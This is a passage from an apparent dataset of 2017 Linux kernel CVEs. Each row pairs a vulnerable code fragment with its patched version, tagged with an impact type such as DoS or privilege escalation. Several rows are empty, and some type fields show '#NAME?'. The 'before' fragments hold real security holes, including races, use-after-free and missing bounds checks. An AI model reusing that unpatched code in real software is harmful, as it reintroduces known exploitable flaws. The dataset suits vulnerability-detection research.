 * Return: 0 if a thread keyring is now present; -errno on failure.
 */
int install_thread_keyring_to_cred(struct cred *new)
{
 struct key *keyring;

 if (new->thread_keyring)
 return 0;

	keyring = keyring_alloc(""_tid"", new->uid, new->gid, new,
				KEY_POS_ALL | KEY_USR_VIEW,
				KEY_ALLOC_QUOTA_OVERRUN,
}

/*
 * Install a thread keyring to the current task if it didn't have one already.
 *
 * Return: 0 if a thread keyring is now present; -errno on failure.
 */
static int install_thread_keyring(void)
{
 if (!new)
 return -ENOMEM;



	ret = install_thread_keyring_to_cred(new);
 if (ret < 0) {
 abort_creds(new);
}

/*
 * Install a process keyring to the given credentials struct if it didn't have
 * one already.  This is allowed to overrun the quota.
 *
 * Return: 0 if a process keyring is now present; -errno on failure.

 */
int install_process_keyring_to_cred(struct cred *new)
{
 struct key *keyring;

 if (new->process_keyring)
 return 0;

	keyring = keyring_alloc(""_pid"", new->uid, new->gid, new,
				KEY_POS_ALL | KEY_USR_VIEW,
}

/*
 * Install a process keyring to the current task if it didn't have one already.

 *
 * Return: 0 if a process keyring is now present; -errno on failure.

 */
static int install_process_keyring(void)
{
	ret = install_process_keyring_to_cred(new);
 if (ret < 0) {
 abort_creds(new);
 return ret;
	}

 return commit_creds(new);
}

/*
 * Install the given keyring as the session keyring of the given credentials
 * struct, replacing the existing one if any.  If the given keyring is NULL,
 * then install a new anonymous session keyring.
 *
 * Return: 0 on success; -errno on failure.
 */
int install_session_keyring_to_cred(struct cred *cred, struct key *keyring)
{
}

/*
 * Install the given keyring as the session keyring of the current task,
 * replacing the existing one if any.  If the given keyring is NULL, then
 * install a new anonymous session keyring.
 *
 * Return: 0 on success; -errno on failure.
 */
static int install_session_keyring(struct key *keyring)
{
"
2017,DoS +Priv ,CVE-2017-7374,"static int fscrypt_d_revalidate(struct dentry *dentry, unsigned int flags)
{
 struct dentry *dir;
 struct fscrypt_info *ci;
 int dir_has_key, cached_with_key;

 if (flags & LOOKUP_RCU)
 return 0;
	}

	ci = d_inode(dir)->i_crypt_info;
 if (ci && ci->ci_keyring_key &&
	    (ci->ci_keyring_key->flags & ((1 << KEY_FLAG_INVALIDATED) |
					  (1 << KEY_FLAG_REVOKED) |
					  (1 << KEY_FLAG_DEAD))))
		ci = NULL;

 /* this should eventually be an flag in d_flags */
 spin_lock(&dentry->d_lock);
	cached_with_key = dentry->d_flags & DCACHE_ENCRYPTED_WITH_KEY;
 spin_unlock(&dentry->d_lock);
	dir_has_key = (ci != NULL);
 dput(dir);

 /*
		fname->disk_name.len = iname->len;
 return 0;
	}
	ret = fscrypt_get_crypt_info(dir);
 if (ret && ret != -EOPNOTSUPP)
 return ret;

	u8 ci_filename_mode;
	u8 ci_flags;
 struct crypto_skcipher *ci_ctfm;
 struct key *ci_keyring_key;
	u8 ci_master_key[FS_KEY_DESCRIPTOR_SIZE];
};

extern struct page *fscrypt_alloc_bounce_page(struct fscrypt_ctx *ctx,
 gfp_t gfp_flags);

/* keyinfo.c */
extern int fscrypt_get_crypt_info(struct inode *);

#endif /* _FSCRYPT_PRIVATE_H */
 kfree(description);
 if (IS_ERR(keyring_key))
 return PTR_ERR(keyring_key);


 if (keyring_key->type != &key_type_logon) {
 printk_once(KERN_WARNING
 ""%s: key type must be logon\n"", __func__);
		res = -ENOKEY;
 goto out;
	}
 down_read(&keyring_key->sem);
	ukp = user_key_payload(keyring_key);
 if (ukp->datalen != sizeof(struct fscrypt_key)) {
		res = -EINVAL;
 up_read(&keyring_key->sem);
 goto out;
	}
	master_key = (struct fscrypt_key *)ukp->data;
 ""%s: key size incorrect: %d\n"",
				__func__, master_key->size);
		res = -ENOKEY;
 up_read(&keyring_key->sem);
 goto out;
	}
	res = derive_key_aes(ctx->nonce, master_key->raw, raw_key);
 up_read(&keyring_key->sem);
 if (res)
 goto out;

	crypt_info->ci_keyring_key = keyring_key;
 return 0;
out:

 key_put(keyring_key);
 return res;
}
 if (!ci)
 return;

 key_put(ci->ci_keyring_key);
 crypto_free_skcipher(ci->ci_ctfm);
 kmem_cache_free(fscrypt_info_cachep, ci);
}

int fscrypt_get_crypt_info(struct inode *inode)
{
 struct fscrypt_info *crypt_info;
 struct fscrypt_context ctx;
	u8 *raw_key = NULL;
 int res;




	res = fscrypt_initialize(inode->i_sb->s_cop->flags);
 if (res)
 return res;

 if (!inode->i_sb->s_cop->get_context)
 return -EOPNOTSUPP;
retry:
	crypt_info = ACCESS_ONCE(inode->i_crypt_info);
 if (crypt_info) {
 if (!crypt_info->ci_keyring_key ||
 key_validate(crypt_info->ci_keyring_key) == 0)
 return 0;
 fscrypt_put_encryption_info(inode, crypt_info);
 goto retry;
	}

	res = inode->i_sb->s_cop->get_context(inode, &ctx, sizeof(ctx));
 if (res < 0) {
	crypt_info->ci_data_mode = ctx.contents_encryption_mode;
	crypt_info->ci_filename_mode = ctx.filenames_encryption_mode;
	crypt_info->ci_ctfm = NULL;
	crypt_info->ci_keyring_key = NULL;
 memcpy(crypt_info->ci_master_key, ctx.master_key_descriptor,
 sizeof(crypt_info->ci_master_key));

 if (res)
 goto out;

 kzfree(raw_key);
	raw_key = NULL;
 if (cmpxchg(&inode->i_crypt_info, NULL, crypt_info) != NULL) {
 put_crypt_info(crypt_info);
 goto retry;
	}
 return 0;

out:
 if (res == -ENOKEY)
		res = 0;
 put_crypt_info(crypt_info);
 kzfree(raw_key);
 return res;
}


void fscrypt_put_encryption_info(struct inode *inode, struct fscrypt_info *ci)
{
 put_crypt_info(ci);
}
EXPORT_SYMBOL(fscrypt_put_encryption_info);

int fscrypt_get_encryption_info(struct inode *inode)
{
 struct fscrypt_info *ci = inode->i_crypt_info;

 if (!ci ||
		(ci->ci_keyring_key &&
		 (ci->ci_keyring_key->flags & ((1 << KEY_FLAG_INVALIDATED) |
					       (1 << KEY_FLAG_REVOKED) |
					       (1 << KEY_FLAG_DEAD)))))
 return fscrypt_get_crypt_info(inode);
 return 0;
}
EXPORT_SYMBOL(fscrypt_get_encryption_info);
","static int fscrypt_d_revalidate(struct dentry *dentry, unsigned int flags)
{
 struct dentry *dir;

 int dir_has_key, cached_with_key;

 if (flags & LOOKUP_RCU)
 return 0;
	}








 /* this should eventually be an flag in d_flags */
 spin_lock(&dentry->d_lock);
	cached_with_key = dentry->d_flags & DCACHE_ENCRYPTED_WITH_KEY;
 spin_unlock(&dentry->d_lock);
	dir_has_key = (d_inode(dir)->i_crypt_info != NULL);
 dput(dir);

 /*
		fname->disk_name.len = iname->len;
 return 0;
	}
	ret = fscrypt_get_encryption_info(dir);
 if (ret && ret != -EOPNOTSUPP)
 return ret;

	u8 ci_filename_mode;
	u8 ci_flags;
 struct crypto_skcipher *ci_ctfm;

	u8 ci_master_key[FS_KEY_DESCRIPTOR_SIZE];
};

extern struct page *fscrypt_alloc_bounce_page(struct fscrypt_ctx *ctx,
 gfp_t gfp_flags);




#endif /* _FSCRYPT_PRIVATE_H */
 kfree(description);
 if (IS_ERR(keyring_key))
 return PTR_ERR(keyring_key);
 down_read(&keyring_key->sem);

 if (keyring_key->type != &key_type_logon) {
 printk_once(KERN_WARNING
 ""%s: key type must be logon\n"", __func__);
		res = -ENOKEY;
 goto out;
	}

	ukp = user_key_payload(keyring_key);
 if (ukp->datalen != sizeof(struct fscrypt_key)) {
		res = -EINVAL;

 goto out;
	}
	master_key = (struct fscrypt_key *)ukp->data;
 ""%s: key size incorrect: %d\n"",
				__func__, master_key->size);
		res = -ENOKEY;

 goto out;
	}
	res = derive_key_aes(ctx->nonce, master_key->raw, raw_key);






out:
 up_read(&keyring_key->sem);
 key_put(keyring_key);
 return res;
}
 if (!ci)
 return;


 crypto_free_skcipher(ci->ci_ctfm);
 kmem_cache_free(fscrypt_info_cachep, ci);
}

int fscrypt_get_encryption_info(struct inode *inode)
{
 struct fscrypt_info *crypt_info;
 struct fscrypt_context ctx;
	u8 *raw_key = NULL;
 int res;

 if (inode->i_crypt_info)
 return 0;

	res = fscrypt_initialize(inode->i_sb->s_cop->flags);
 if (res)
 return res;

 if (!inode->i_sb->s_cop->get_context)
 return -EOPNOTSUPP;










	res = inode->i_sb->s_cop->get_context(inode, &ctx, sizeof(ctx));
 if (res < 0) {
	crypt_info->ci_data_mode = ctx.contents_encryption_mode;
	crypt_info->ci_filename_mode = ctx.filenames_encryption_mode;
	crypt_info->ci_ctfm = NULL;

 memcpy(crypt_info->ci_master_key, ctx.master_key_descriptor,
 sizeof(crypt_info->ci_master_key));

 if (res)
 goto out;

 if (cmpxchg(&inode->i_crypt_info, NULL, crypt_info) == NULL)
		crypt_info = NULL;






out:
 if (res == -ENOKEY)
		res = 0;
 put_crypt_info(crypt_info);
 kzfree(raw_key);
 return res;
}
EXPORT_SYMBOL(fscrypt_get_encryption_info);

void fscrypt_put_encryption_info(struct inode *inode, struct fscrypt_info *ci)
{
 put_crypt_info(ci);
}
EXPORT_SYMBOL(fscrypt_put_encryption_info);














"
2017,DoS ,CVE-2017-7346,,
2017,DoS Overflow +Priv ,CVE-2017-7308,,
2017,DoS Overflow +Priv ,CVE-2017-7294,,
2017,DoS +Info ,CVE-2017-7277," atomic_sub(skb->truesize, &sk->sk_rmem_alloc);
}










/*
 * Note: We dont mem charge error packets (no sk_forward_alloc changes)
 */
	skb->sk = sk;
	skb->destructor = sock_rmem_free;
 atomic_add(skb->truesize, &sk->sk_rmem_alloc);


 /* before exiting rcu section, make sure dst is refcounted */
 skb_dst_force(skb);
}
EXPORT_SYMBOL(kernel_sendmsg);











/*
 * called from sock_recv_timestamp() if sock_flag(sk, SOCK_RCVTSTAMP)
 */
 put_cmsg(msg, SOL_SOCKET,
			 SCM_TIMESTAMPING, sizeof(tss), &tss);

 if (skb->len && (sk->sk_tsflags & SOF_TIMESTAMPING_OPT_STATS))

 put_cmsg(msg, SOL_SOCKET, SCM_TIMESTAMPING_OPT_STATS,
				 skb->len, skb->data);
	}
"," atomic_sub(skb->truesize, &sk->sk_rmem_alloc);
}

static void skb_set_err_queue(struct sk_buff *skb)
{
 /* pkt_type of skbs received on local sockets is never PACKET_OUTGOING.
	 * So, it is safe to (mis)use it to mark skbs on the error queue.
 */
	skb->pkt_type = PACKET_OUTGOING;
 BUILD_BUG_ON(PACKET_OUTGOING == 0);
}

/*
 * Note: We dont mem charge error packets (no sk_forward_alloc changes)
 */
	skb->sk = sk;
	skb->destructor = sock_rmem_free;
 atomic_add(skb->truesize, &sk->sk_rmem_alloc);
 skb_set_err_queue(skb);

 /* before exiting rcu section, make sure dst is refcounted */
 skb_dst_force(skb);
}
EXPORT_SYMBOL(kernel_sendmsg);

static bool skb_is_err_queue(const struct sk_buff *skb)
{
 /* pkt_type of skbs enqueued on the error queue are set to
	 * PACKET_OUTGOING in skb_set_err_queue(). This is only safe to do
	 * in recvmsg, since skbs received on a local socket will never
	 * have a pkt_type of PACKET_OUTGOING.
 */
 return skb->pkt_type == PACKET_OUTGOING;
}

/*
 * called from sock_recv_timestamp() if sock_flag(sk, SOCK_RCVTSTAMP)
 */
 put_cmsg(msg, SOL_SOCKET,
			 SCM_TIMESTAMPING, sizeof(tss), &tss);

 if (skb_is_err_queue(skb) && skb->len &&
		    (sk->sk_tsflags & SOF_TIMESTAMPING_OPT_STATS))
 put_cmsg(msg, SOL_SOCKET, SCM_TIMESTAMPING_OPT_STATS,
				 skb->len, skb->data);
	}
"
2017,DoS ,CVE-2017-7273," if (!(quirks & CP_RDESC_SWAPPED_MIN_MAX))
 return rdesc;




 for (i = 0; i < *rsize - 4; i++)
 if (rdesc[i] == 0x29 && rdesc[i + 2] == 0x19) {
			rdesc[i] = 0x19;
"," if (!(quirks & CP_RDESC_SWAPPED_MIN_MAX))
 return rdesc;

 if (*rsize < 4)
 return rdesc;

 for (i = 0; i < *rsize - 4; i++)
 if (rdesc[i] == 0x29 && rdesc[i + 2] == 0x19) {
			rdesc[i] = 0x19;
"
2017,DoS ,CVE-2017-7261,,
2017,DoS Overflow ,CVE-2017-7187,,
2017,DoS ,CVE-2017-6951,,
2017,DoS ,CVE-2017-6874," struct hlist_node node;
 struct user_namespace *ns;
 kuid_t uid;
 atomic_t count;
 atomic_t ucount[UCOUNT_COUNTS];
};


		new->ns = ns;
		new->uid = uid;
 atomic_set(&new->count, 0);

 spin_lock_irq(&ucounts_lock);
		ucounts = find_ucounts(ns, uid, hashent);
			ucounts = new;
		}
	}
 if (!atomic_add_unless(&ucounts->count, 1, INT_MAX))
		ucounts = NULL;


 spin_unlock_irq(&ucounts_lock);
 return ucounts;
}
{
 unsigned long flags;

 if (atomic_dec_and_test(&ucounts->count)) {
 spin_lock_irqsave(&ucounts_lock, flags);

 hlist_del_init(&ucounts->node);
 spin_unlock_irqrestore(&ucounts_lock, flags);



 kfree(ucounts);
	}
}

static inline bool atomic_inc_below(atomic_t *v, int u)
"," struct hlist_node node;
 struct user_namespace *ns;
 kuid_t uid;
 int count;
 atomic_t ucount[UCOUNT_COUNTS];
};


		new->ns = ns;
		new->uid = uid;
		new->count = 0;

 spin_lock_irq(&ucounts_lock);
		ucounts = find_ucounts(ns, uid, hashent);
			ucounts = new;
		}
	}
 if (ucounts->count == INT_MAX)
		ucounts = NULL;
 else
		ucounts->count += 1;
 spin_unlock_irq(&ucounts_lock);
 return ucounts;
}
{
 unsigned long flags;

 spin_lock_irqsave(&ucounts_lock, flags);
	ucounts->count -= 1;
 if (!ucounts->count)
 hlist_del_init(&ucounts->node);
 else
		ucounts = NULL;
 spin_unlock_irqrestore(&ucounts_lock, flags);

 kfree(ucounts);

}

static inline bool atomic_inc_below(atomic_t *v, int u)
"
2017,DoS ,CVE-2017-6353," if (!asoc)
 return -EINVAL;







 /* An association cannot be branched off from an already peeled-off
	 * socket, nor is this supported for tcp style sockets.
 */
 */
 release_sock(sk);
		current_timeo = schedule_timeout(current_timeo);
 if (sk != asoc->base.sk)
 goto do_error;
 lock_sock(sk);

		*timeo_p = current_timeo;
"," if (!asoc)
 return -EINVAL;

 /* If there is a thread waiting on more sndbuf space for
	 * sending on this asoc, it cannot be peeled.
 */
 if (waitqueue_active(&asoc->wait))
 return -EBUSY;

 /* An association cannot be branched off from an already peeled-off
	 * socket, nor is this supported for tcp style sockets.
 */
 */
 release_sock(sk);
		current_timeo = schedule_timeout(current_timeo);


 lock_sock(sk);

		*timeo_p = current_timeo;
"
2017,DoS ,CVE-2017-6348," *    for deallocating this structure if it's complex. If not the user can
 *    just supply kfree, which should take care of the job.
 */
#ifdef CONFIG_LOCKDEP
static int hashbin_lock_depth = 0;
#endif
int hashbin_delete( hashbin_t* hashbin, FREE_FUNC free_func)
{
 irda_queue_t* queue;
 IRDA_ASSERT(hashbin->magic == HB_MAGIC, return -1;);

 /* Synchronize */
 if ( hashbin->hb_type & HB_LOCK ) {
 spin_lock_irqsave_nested(&hashbin->hb_spinlock, flags,
					 hashbin_lock_depth++);
	}

 /*
	 *  Free the entries in the hashbin, TODO: use hashbin_clear when
	 *  it has been shown to work
 */
 for (i = 0; i < HASHBIN_SIZE; i ++ ) {
		queue = dequeue_first((irda_queue_t**) &hashbin->hb_queue[i]);
 while (queue ) {
 if (free_func)
				(*free_func)(queue);
			queue = dequeue_first(
				(irda_queue_t**) &hashbin->hb_queue[i]);







		}
	}

	hashbin->magic = ~HB_MAGIC;

 /* Release lock */
 if ( hashbin->hb_type & HB_LOCK) {
 spin_unlock_irqrestore(&hashbin->hb_spinlock, flags);
#ifdef CONFIG_LOCKDEP
		hashbin_lock_depth--;
#endif
	}

 /*
	 *  Free the hashbin structure
"," *    for deallocating this structure if it's complex. If not the user can
 *    just supply kfree, which should take care of the job.
 */



int hashbin_delete( hashbin_t* hashbin, FREE_FUNC free_func)
{
 irda_queue_t* queue;
 IRDA_ASSERT(hashbin->magic == HB_MAGIC, return -1;);

 /* Synchronize */
 if (hashbin->hb_type & HB_LOCK)
 spin_lock_irqsave(&hashbin->hb_spinlock, flags);



 /*
	 *  Free the entries in the hashbin, TODO: use hashbin_clear when
	 *  it has been shown to work
 */
 for (i = 0; i < HASHBIN_SIZE; i ++ ) {
 while (1) {
			queue = dequeue_first((irda_queue_t**) &hashbin->hb_queue[i]);

 if (!queue)
 break;

 if (free_func) {
 if (hashbin->hb_type & HB_LOCK)
 spin_unlock_irqrestore(&hashbin->hb_spinlock, flags);
 free_func(queue);
 if (hashbin->hb_type & HB_LOCK)
 spin_lock_irqsave(&hashbin->hb_spinlock, flags);
			}
		}
	}

	hashbin->magic = ~HB_MAGIC;

 /* Release lock */
 if (hashbin->hb_type & HB_LOCK)
 spin_unlock_irqrestore(&hashbin->hb_spinlock, flags);





 /*
	 *  Free the hashbin structure
"
2017,DoS ,CVE-2017-6347," if (skb->ip_summed != CHECKSUM_COMPLETE)
 return;

 if (offset != 0)
 csum = csum_sub(csum,
  csum_partial(skb_transport_header(skb) + tlen,
 				     offset, 0));

 put_cmsg(msg, SOL_IP, IP_CHECKSUM, sizeof(__wsum), &csum);
}
"," if (skb->ip_summed != CHECKSUM_COMPLETE)
 return;

 if (offset != 0) {
 int tend_off = skb_transport_offset(skb) + tlen;
 csum = csum_sub(csum, skb_checksum(skb, tend_off, offset, 0));
 }

 put_cmsg(msg, SOL_IP, IP_CHECKSUM, sizeof(__wsum), &csum);
}
"
2017,DoS ,CVE-2017-6346,"
static int fanout_add(struct sock *sk, u16 id, u16 type_flags)
{

 struct packet_sock *po = pkt_sk(sk);
 struct packet_fanout *f, *match;
	u8 type = type_flags & 0xff;
 return -EINVAL;
	}




 if (!po->running)
 return -EINVAL;


 if (po->fanout)
 return -EALREADY;

 if (type == PACKET_FANOUT_ROLLOVER ||
	    (type_flags & PACKET_FANOUT_FLAG_ROLLOVER)) {
		po->rollover = kzalloc(sizeof(*po->rollover), GFP_KERNEL);
 if (!po->rollover)
 return -ENOMEM;
 atomic_long_set(&po->rollover->num, 0);
 atomic_long_set(&po->rollover->num_huge, 0);
 atomic_long_set(&po->rollover->num_failed, 0);


	}

 mutex_lock(&fanout_mutex);
	match = NULL;
 list_for_each_entry(f, &fanout_list, list) {
 if (f->id == id &&
		}
	}
out:
 mutex_unlock(&fanout_mutex);
 if (err) {
 kfree(po->rollover);
		po->rollover = NULL;
	}

 return err;
}

 struct packet_sock *po = pkt_sk(sk);
 struct packet_fanout *f;

	f = po->fanout;
 if (!f)
 return;

 mutex_lock(&fanout_mutex);
	po->fanout = NULL;










 if (atomic_dec_and_test(&f->sk_ref)) {
 list_del(&f->list);
 dev_remove_pack(&f->prot_hook);
 fanout_release_data(f);
 kfree(f);
	}
 mutex_unlock(&fanout_mutex);

 if (po->rollover)
 kfree_rcu(po->rollover, rcu);
}

static bool packet_extra_vlan_len_allowed(const struct net_device *dev,
","
static int fanout_add(struct sock *sk, u16 id, u16 type_flags)
{
 struct packet_rollover *rollover = NULL;
 struct packet_sock *po = pkt_sk(sk);
 struct packet_fanout *f, *match;
	u8 type = type_flags & 0xff;
 return -EINVAL;
	}

 mutex_lock(&fanout_mutex);

	err = -EINVAL;
 if (!po->running)
 goto out;

	err = -EALREADY;
 if (po->fanout)
 goto out;

 if (type == PACKET_FANOUT_ROLLOVER ||
	    (type_flags & PACKET_FANOUT_FLAG_ROLLOVER)) {
		err = -ENOMEM;
		rollover = kzalloc(sizeof(*rollover), GFP_KERNEL);
 if (!rollover)
 goto out;
 atomic_long_set(&rollover->num, 0);
 atomic_long_set(&rollover->num_huge, 0);
 atomic_long_set(&rollover->num_failed, 0);
		po->rollover = rollover;
	}


	match = NULL;
 list_for_each_entry(f, &fanout_list, list) {
 if (f->id == id &&
		}
	}
out:
 if (err && rollover) {
 kfree(rollover);

		po->rollover = NULL;
	}
 mutex_unlock(&fanout_mutex);
 return err;
}

 struct packet_sock *po = pkt_sk(sk);
 struct packet_fanout *f;





 mutex_lock(&fanout_mutex);
	f = po->fanout;
 if (f) {
		po->fanout = NULL;

 if (atomic_dec_and_test(&f->sk_ref)) {
 list_del(&f->list);
 dev_remove_pack(&f->prot_hook);
 fanout_release_data(f);
 kfree(f);
		}

 if (po->rollover)
 kfree_rcu(po->rollover, rcu);



	}
 mutex_unlock(&fanout_mutex);



}

static bool packet_extra_vlan_len_allowed(const struct net_device *dev,
"
2017,DoS ,CVE-2017-6345,"		 * another trick required to cope with how the PROCOM state
		 * machine works. -acme
 */


		skb->sk = sk;

	}
 if (!sock_owned_by_user(sk))
 llc_conn_rcv(sk, skb);

	ev->type   = LLC_SAP_EV_TYPE_PDU;
	ev->reason = 0;


	skb->sk = sk;

 llc_sap_state_process(sap, skb);
}

","		 * another trick required to cope with how the PROCOM state
		 * machine works. -acme
 */
 skb_orphan(skb);
 sock_hold(sk);
		skb->sk = sk;
		skb->destructor = sock_efree;
	}
 if (!sock_owned_by_user(sk))
 llc_conn_rcv(sk, skb);

	ev->type   = LLC_SAP_EV_TYPE_PDU;
	ev->reason = 0;
 skb_orphan(skb);
 sock_hold(sk);
	skb->sk = sk;
	skb->destructor = sock_efree;
 llc_sap_state_process(sap, skb);
}

"
2017,Exec Code ,CVE-2017-6264,,
2017,DoS ,CVE-2017-6214,"				ret = -EAGAIN;
 break;
			}






 sk_wait_data(sk, &timeo, NULL);
 if (signal_pending(current)) {
				ret = sock_intr_errno(timeo);
","				ret = -EAGAIN;
 break;
			}
 /* if __tcp_splice_read() got nothing while we have
			 * an skb in receive queue, we do not want to loop.
			 * This might happen with URG data.
 */
 if (!skb_queue_empty(&sk->sk_receive_queue))
 break;
 sk_wait_data(sk, &timeo, NULL);
 if (signal_pending(current)) {
				ret = sock_intr_errno(timeo);
"
2017,DoS ,CVE-2017-6074," if (inet_csk(sk)->icsk_af_ops->conn_request(sk,
								    skb) < 0)
 return 1;
 goto discard;

		}
 if (dh->dccph_type == DCCP_PKT_RESET)
 goto discard;
"," if (inet_csk(sk)->icsk_af_ops->conn_request(sk,
								    skb) < 0)
 return 1;
 consume_skb(skb);
 return 0;
		}
 if (dh->dccph_type == DCCP_PKT_RESET)
 goto discard;
"
2017,#NAME?,CVE-2017-6001," return 0;
}
































/**
 * sys_perf_event_open - open a performance event, associate it to a task/cpu
 *
	}

 if (move_group) {
		gctx = group_leader->ctx;
 mutex_lock_double(&gctx->mutex, &ctx->mutex);
 if (gctx->task == TASK_TOMBSTONE) {
			err = -ESRCH;
 goto err_locked;
		}



















	} else {
 mutex_lock(&ctx->mutex);
	}
 perf_unpin_context(ctx);

 if (move_group)
 mutex_unlock(&gctx->mutex);
 mutex_unlock(&ctx->mutex);

 if (task) {

err_locked:
 if (move_group)
 mutex_unlock(&gctx->mutex);
 mutex_unlock(&ctx->mutex);
/* err_file: */
 fput(event_file);
"," return 0;
}

/*
 * Variation on perf_event_ctx_lock_nested(), except we take two context
 * mutexes.
 */
static struct perf_event_context *
__perf_event_ctx_lock_double(struct perf_event *group_leader,
 struct perf_event_context *ctx)
{
 struct perf_event_context *gctx;

again:
 rcu_read_lock();
	gctx = READ_ONCE(group_leader->ctx);
 if (!atomic_inc_not_zero(&gctx->refcount)) {
 rcu_read_unlock();
 goto again;
	}
 rcu_read_unlock();

 mutex_lock_double(&gctx->mutex, &ctx->mutex);

 if (group_leader->ctx != gctx) {
 mutex_unlock(&ctx->mutex);
 mutex_unlock(&gctx->mutex);
 put_ctx(gctx);
 goto again;
	}

 return gctx;
}

/**
 * sys_perf_event_open - open a performance event, associate it to a task/cpu
 *
	}

 if (move_group) {
		gctx = __perf_event_ctx_lock_double(group_leader, ctx);

 if (gctx->task == TASK_TOMBSTONE) {
			err = -ESRCH;
 goto err_locked;
		}

 /*
		 * Check if we raced against another sys_perf_event_open() call
		 * moving the software group underneath us.
 */
 if (!(group_leader->group_caps & PERF_EV_CAP_SOFTWARE)) {
 /*
			 * If someone moved the group out from under us, check
			 * if this new event wound up on the same ctx, if so
			 * its the regular !move_group case, otherwise fail.
 */
 if (gctx != ctx) {
				err = -EINVAL;
 goto err_locked;
			} else {
 perf_event_ctx_unlock(group_leader, gctx);
				move_group = 0;
			}
		}
	} else {
 mutex_lock(&ctx->mutex);
	}
 perf_unpin_context(ctx);

 if (move_group)
 perf_event_ctx_unlock(group_leader, gctx);
 mutex_unlock(&ctx->mutex);

 if (task) {

err_locked:
 if (move_group)
 perf_event_ctx_unlock(group_leader, gctx);
 mutex_unlock(&ctx->mutex);
/* err_file: */
 fput(event_file);
"
2017,DoS ,CVE-2017-5986," */
 release_sock(sk);
		current_timeo = schedule_timeout(current_timeo);
 BUG_ON(sk != asoc->base.sk);

 lock_sock(sk);

		*timeo_p = current_timeo;
"," */
 release_sock(sk);
		current_timeo = schedule_timeout(current_timeo);
 if (sk != asoc->base.sk)
 goto do_error;
 lock_sock(sk);

		*timeo_p = current_timeo;
"
2017,DoS ,CVE-2017-5972,,
2017,DoS ,CVE-2017-5970,"		pktinfo->ipi_ifindex = 0;
		pktinfo->ipi_spec_dst.s_addr = 0;
	}
 skb_dst_drop(skb);







}

int ip_setsockopt(struct sock *sk, int level,
","		pktinfo->ipi_ifindex = 0;
		pktinfo->ipi_spec_dst.s_addr = 0;
	}
 /* We need to keep the dst for __ip_options_echo()
	 * We could restrict the test to opt.ts_needtime || opt.srr,
	 * but the following is good enough as IP options are not often used.
 */
 if (unlikely(IPCB(skb)->opt.optlen))
 skb_dst_force(skb);
 else
 skb_dst_drop(skb);
}

int ip_setsockopt(struct sock *sk, int level,
"
2017,#NAME?,CVE-2017-5967,,
2017,,CVE-2017-5897,,
2017,Bypass ,CVE-2017-5669," * ""raddr"" thing points to kernel space, and there has to be a wrapper around
 * this.
 */
long do_shmat(int shmid, char __user *shmaddr, int shmflg, ulong *raddr,
 unsigned long shmlba)
{
 struct shmid_kernel *shp;
 unsigned long addr;
 goto out;
 else if ((addr = (ulong)shmaddr)) {
 if (addr & (shmlba - 1)) {
 if (shmflg & SHM_RND)
				addr &= ~(shmlba - 1);	   /* round down */





 else
#ifndef __ARCH_FORCE_SHMLBA
 if (addr & ~PAGE_MASK)
"," * ""raddr"" thing points to kernel space, and there has to be a wrapper around
 * this.
 */
long do_shmat(int shmid, char __user *shmaddr, int shmflg,
 ulong *raddr, unsigned long shmlba)
{
 struct shmid_kernel *shp;
 unsigned long addr;
 goto out;
 else if ((addr = (ulong)shmaddr)) {
 if (addr & (shmlba - 1)) {
 /*
			 * Round down to the nearest multiple of shmlba.
			 * For sane do_mmap_pgoff() parameters, avoid
			 * round downs that trigger nil-page and MAP_FIXED.
 */
 if ((shmflg & SHM_RND) && addr >= shmlba)
				addr &= ~(shmlba - 1);
 else
#ifndef __ARCH_FORCE_SHMLBA
 if (addr & ~PAGE_MASK)
"
2017,DoS Overflow ,CVE-2017-5577," sizeof(struct vc4_shader_state)) ||
	    temp_size < exec_size) {
 DRM_ERROR(""overflow in exec arguments\n"");

 goto fail;
	}

"," sizeof(struct vc4_shader_state)) ||
	    temp_size < exec_size) {
 DRM_ERROR(""overflow in exec arguments\n"");
		ret = -EINVAL;
 goto fail;
	}

"
2017,DoS Overflow ,CVE-2017-5576,"					  args->shader_rec_count);
 struct vc4_bo *bo;

 if (uniforms_offset < shader_rec_offset ||

	    exec_size < uniforms_offset ||
	    args->shader_rec_count >= (UINT_MAX /
 sizeof(struct vc4_shader_state)) ||
","					  args->shader_rec_count);
 struct vc4_bo *bo;

 if (shader_rec_offset < args->bin_cl_size ||
	    uniforms_offset < shader_rec_offset ||
	    exec_size < uniforms_offset ||
	    args->shader_rec_count >= (UINT_MAX /
 sizeof(struct vc4_shader_state)) ||
"
2017,#NAME?,CVE-2017-5551," int error;

 if (type == ACL_TYPE_ACCESS) {
		error = posix_acl_equiv_mode(acl, &inode->i_mode);
 if (error < 0)
 return 0;
 if (error == 0)
			acl = NULL;
	}

	inode->i_ctime = current_time(inode);
"," int error;

 if (type == ACL_TYPE_ACCESS) {
		error = posix_acl_update_mode(inode,
				&inode->i_mode, &acl);
 if (error)
 return error;

	}

	inode->i_ctime = current_time(inode);
"
2017,#NAME?,CVE-2017-5550,"}
EXPORT_SYMBOL(iov_iter_copy_from_user_atomic);





















static void pipe_advance(struct iov_iter *i, size_t size)
{
 struct pipe_inode_info *pipe = i->pipe;
 struct pipe_buffer *buf;
 int idx = i->idx;
 size_t off = i->iov_offset, orig_sz;

 if (unlikely(i->count < size))
		size = i->count;
	orig_sz = size;

 if (size) {



 if (off) /* make it relative to the beginning of buffer */
 size += off - pipe->bufs[idx].offset;
 while (1) {
			buf = &pipe->bufs[idx];
 if (size <= buf->len)
 break;
 size -= buf->len;
			idx = next_idx(idx, pipe);
		}
		buf->len = size;
		i->idx = idx;
		off = i->iov_offset = buf->offset + size;
	}
 if (off)
		idx = next_idx(idx, pipe);
 if (pipe->nrbufs) {
 int unused = (pipe->curbuf + pipe->nrbufs) & (pipe->buffers - 1);
 /* [curbuf,unused) is in use.  Free [idx,unused) */
 while (idx != unused) {
 pipe_buf_release(pipe, &pipe->bufs[idx]);
			idx = next_idx(idx, pipe);
 pipe->nrbufs--;
		}
	}
	i->count -= orig_sz;


}

void iov_iter_advance(struct iov_iter *i, size_t size)
 size_t count)
{
 BUG_ON(direction != ITER_PIPE);

	i->type = direction;
	i->pipe = pipe;
	i->idx = (pipe->curbuf + pipe->nrbufs) & (pipe->buffers - 1);
","}
EXPORT_SYMBOL(iov_iter_copy_from_user_atomic);

static inline void pipe_truncate(struct iov_iter *i)
{
 struct pipe_inode_info *pipe = i->pipe;
 if (pipe->nrbufs) {
 size_t off = i->iov_offset;
 int idx = i->idx;
 int nrbufs = (idx - pipe->curbuf) & (pipe->buffers - 1);
 if (off) {
 pipe->bufs[idx].len = off - pipe->bufs[idx].offset;
			idx = next_idx(idx, pipe);
			nrbufs++;
		}
 while (pipe->nrbufs > nrbufs) {
